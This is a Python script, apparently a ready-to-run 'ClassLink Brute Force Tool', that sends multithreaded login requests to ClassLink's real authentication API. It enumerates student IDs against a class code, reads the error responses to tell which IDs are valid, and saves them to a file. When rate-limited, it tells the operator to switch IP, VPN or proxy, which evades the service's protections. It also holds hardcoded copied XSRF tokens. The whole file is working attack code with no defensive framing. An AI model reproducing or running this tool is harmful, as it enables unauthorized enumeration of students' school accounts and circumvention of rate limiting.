import requests
import json
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from datetime import datetime
import os
from dotenv import load_dotenv

load_dotenv()

class ClassLinkBruteForcer:
    def __init__(self, max_workers=100, log_file="SSID-SCRAPER.log"):
        self.max_workers = max_workers
        self.found_ids = []
        self.lock = threading.Lock()
        self.processed = 0
        self.success_count = 0
        self.error_count = 0
        self.session = None
        self.start_time = None
        self.rate_limited = False
        self.pause_event = threading.Event()

        # Setup logging
        self.setup_logging(log_file)
        self.create_session()

    def create_session(self):
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=self.max_workers,
            pool_maxsize=self.max_workers,
            max_retries=2
        )
        self.session.mount('https://', adapter)

    def setup_logging(self, log_file):
        self.logger = logging.getLogger('ClassLinkBruteForcer')
        self.logger.setLevel(logging.INFO)

        # Clear any existing handlers to avoid duplicates
        for handler in self.logger.handlers[:]:
            self.logger.removeHandler(handler)

        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        file_handler.setFormatter(formatter)

        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)

        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)

    def get_last_number(self):
        if os.path.exists("SSID-SCRAPER.log"):
            try:
                with open("SSID-SCRAPER.log", 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                    for line in reversed(lines):
                        if "s" in line and "Status:" in line:
                            # Extract number from log line - FIXED
                            parts = line.split("s")
                            if len(parts) > 1:
                                num_str = parts[1].split(" ")[0]
                                if num_str.isdigit():
                                    last_num = int(num_str)
                                    self.logger.info("Resuming from log number: %s", last_num)
                                    return last_num
            except Exception as e:
                self.logger.error("Error reading log file: %s", e)

        return 10000

    def handle_rate_limit(self):
        with self.lock:
            if not self.rate_limited:
                self.rate_limited = True
                print("\n" + "!" * 60)
                print("!!! RATE LIMIT DETECTED (429) !!!")
                print("!!! CHANGE NOW !!!")
                print("!" * 60)
                print("\nThe script has been rate limited.")
                print("Please change your IP/VPN/proxy or wait for the rate limit to reset.")
                print("Press Enter to continue when ready...")

                self.pause_event.set()

                input()

                self.pause_event.clear()
                self.rate_limited = False
                print("Resuming brute force...")
                self.logger.info("Resumed after rate limit")

    def log_request(self, number, status_code, response_time=0, error=None):
        timestamp = datetime.now().strftime("%H:%M:%S")
        try:
            if error:
                self.logger.error("[%s] s%s - ERROR: %s", timestamp, number, error)
            elif status_code == 401:
                self.logger.warning("[%s] s%s - Status: %s", timestamp, number, status_code)
            elif status_code == 200:
                self.logger.critical("[%s] s%s - Status: %s (SUCCESS!)", timestamp, number, status_code)
            elif status_code == 429:
                self.logger.error("[%s] s%s - Status: %s (Rate Limited)", timestamp, number, status_code)
        except Exception as e:
            # Fallback logging if formatting fails
            print(f"Logging error: {e}")

    def send_request(self, number):
        if self.pause_event.is_set():
            return

        url = "https://auth.apis.classlink.com/v1/login/v3.0/authenticate"

        headers = {
            "Host": "auth.apis.classlink.com",
            "Cookie": "XSRF-TOKEN=O%2BEYNG59ONUN4vtdTUYZHv3QatuSfHnQRIHMruEKrM8%3D; XSRF-CHALLENGE=w3%2BWT7Y1sF6jTJZc0A7cwQ%3D%3D",
            "Content-Length": "79",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Cache-Control": "no-store",
            "X-Xsrf-Token": "O+EYNG59ONUN4vtdTUYZHv3QatuSfHnQRIHMruEKrM8=",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Ch-Ua": '"Not A Brand";v="99", "Chromium";v="142"',
            "Sec-Ch-Ua-Mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://login.classlink.com",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
        }

        payload = {
            "ac_questionResponses": json.dumps({"f6": f"s{number}", "role": True}),
            "ac_code": os.getenv("CLASSLINK_CLASS_CODE")
        }

        start_time = time.time()
        try:
            response = self.session.post(url, headers=headers, json=payload, timeout=3)
            response_time = time.time() - start_time

            with self.lock:
                self.processed += 1

                if response.status_code in [200, 401, 429]:
                    self.log_request(number, response.status_code, response_time)

                if response.status_code == 401:
                    response_text = response.text.lower()
                    if "401.3" in response.text or "forbidden" in response_text:
                        self.logger.critical("[FOUND] s%s - 401.3 (Valid ID found!)", number)
                        print(f"\n[FOUND] s{number} - 401.3 Response (Valid ID!)")
                        self.found_ids.append(f"s{number}")
                        self.success_count += 1
                        with open("ssids.txt", "a") as f:
                            f.write(f"s{number}\n")
                elif response.status_code == 200:
                    self.logger.critical("[FOUND] s%s - 200 OK (Potential success!)", number)
                    print(f"\n[FOUND] s{number} - 200 OK Response (Potential success!)")
                    self.found_ids.append(f"s{number}")
                    self.success_count += 1
                    with open("ssids.txt", "a") as f:
                        f.write(f"s{number}\n")
                elif response.status_code == 429:
                    self.handle_rate_limit()

        except requests.exceptions.Timeout:
            with self.lock:
                self.processed += 1
                self.error_count += 1
        except requests.exceptions.ConnectionError:
            with self.lock:
                self.processed += 1
                self.error_count += 1
        except Exception as e:
            with self.lock:
                self.processed += 1
                self.error_count += 1
                self.logger.error("Request error for s%s: %s", number, e)

    def print_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            rate = self.processed / elapsed if elapsed > 0 else 0
            progress_percent = (self.processed / self.total_numbers) * 100

            stats_log = "Stats | Processed: %s | Found: %s | Errors: %s | Progress: %.2f%% | Rate: %.1f/s | ETA: %.1fh" % (
                self.processed, self.success_count, self.error_count, progress_percent, rate, self.get_eta(rate)
            )

            stats_console = f"[STATS] Processed: {self.processed:,} | Found: {self.success_count} | Progress: {progress_percent:.2f}% | Rate: {rate:.1f}/s"

            print(stats_console)
            self.logger.info(stats_log)

    def get_eta(self, current_rate):
        if current_rate > 0:
            remaining = self.total_numbers - self.processed
            return (remaining / current_rate) / 3600
        return 0

    def get_current_rate(self):
        if hasattr(self, 'start_time') and self.processed > 0:
            elapsed = time.time() - self.start_time
            return self.processed / elapsed
        return 0

    def run_brute_force(self, start=None, end=9999999, batch_size=50000, stats_interval=10):
        if start is None:
            start = self.get_last_number()

        print(f"Starting optimized brute force...")
        print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Range: {start:,} to {end:,}")
        print(f"Threads: {self.max_workers}")
        print(f"Batch size: {batch_size:,}")
        print("-" * 80)
        print("NOTE: When rate limited (429), the script will pause and wait for you to change IP/VPN")
        print("-" * 80)

        self.start_time = time.time()
        numbers = list(range(start, end + 1))
        self.total_numbers = len(numbers)

        self.logger.info("Starting brute force: range %s-%s, workers: %s", start, end, self.max_workers)

        last_stats_time = time.time()
        last_save_time = time.time()

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            for i in range(0, self.total_numbers, batch_size):
                if self.pause_event.is_set():
                    print("Waiting for user input to resume...")
                    self.pause_event.wait()

                batch = numbers[i:i + batch_size]
                futures = [executor.submit(self.send_request, num) for num in batch]

                completed = 0
                for future in as_completed(futures):
                    if self.pause_event.is_set():
                        for f in futures:
                            f.cancel()
                        break

                    completed += 1
                    future.result()

                    if completed % 500 == 0:
                        current_time = time.time()
                        if current_time - last_stats_time >= stats_interval:
                            self.print_stats()
                            last_stats_time = current_time

                if self.pause_event.is_set():
                    break

                progress = min(i + batch_size, self.total_numbers)
                percentage = (progress / self.total_numbers) * 100
                rate = self.get_current_rate()

                print(f"[BATCH] Progress: {progress:,}/{self.total_numbers:,} ({percentage:.2f}%) | Rate: {rate:.1f}/s | Found: {len(self.found_ids)}")

        self.final_stats()

    def final_stats(self):
        total_time = time.time() - self.start_time
        print("\n" + "=" * 80)
        print("Scan completed!")
        print(f"Finished at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total time: {total_time / 3600:.2f} hours")
        print(f"Total processed: {self.processed:,}")
        print(f"Valid IDs found: {len(self.found_ids)}")
        print(f"Errors: {self.error_count}")
        print(f"Average rate: {self.processed / total_time:.1f} requests/second")
        print(f"Results saved to: ssids.txt")
        print(f"Detailed logs in: SSID-SCRAPER.log")

        if self.found_ids:
            print(f"\nFound IDs:")
            for id in self.found_ids[-10:]:
                print(f"  * {id}")
            if len(self.found_ids) > 10:
                print(f"  ... and {len(self.found_ids) - 10} more")

        self.logger.info("Brute force completed. Processed: %s, Found: %s, Time: %.2fs",
                        self.processed, len(self.found_ids), total_time)


# Usage - Fixed environment variable handling
if __name__ == "__main__":
    print("ClassLink Brute Force Tool - OPTIMIZED")
    print("=" * 50)

    try:
        MAX_WORKERS = int(os.getenv("SIDS_MAX_WORKERS", "100"))
    except (TypeError, ValueError):
        MAX_WORKERS = 100

    try:
        END_RANGE = int(os.getenv("SIDS_END_RANGE", "9999999"))
    except (TypeError, ValueError):
        END_RANGE = 9999999

    try:
        BATCH_SIZE = int(os.getenv("SIDS_BATCH_SIZE", "50000"))
    except (TypeError, ValueError):
        BATCH_SIZE = 50000

    try:
        STATS_INTERVAL = int(os.getenv("SIDS_STATS_INTERVAL", "10"))
    except (TypeError, ValueError):
        STATS_INTERVAL = 10

    brute_forcer = ClassLinkBruteForcer(max_workers=MAX_WORKERS)

    try:
        brute_forcer.run_brute_force(
            start=None,
            end=END_RANGE,
            batch_size=BATCH_SIZE,
            stats_interval=STATS_INTERVAL
        )
    except KeyboardInterrupt:
        print("\nScan interrupted by user!")
        print("Progress saved - run again to resume")
        brute_forcer.logger.info("Scan interrupted by user")
        brute_forcer.print_stats()
    except Exception as e:
        print(f"\nUnexpected error: {e}")
        brute_forcer.logger.error("Unexpected error: %s", e)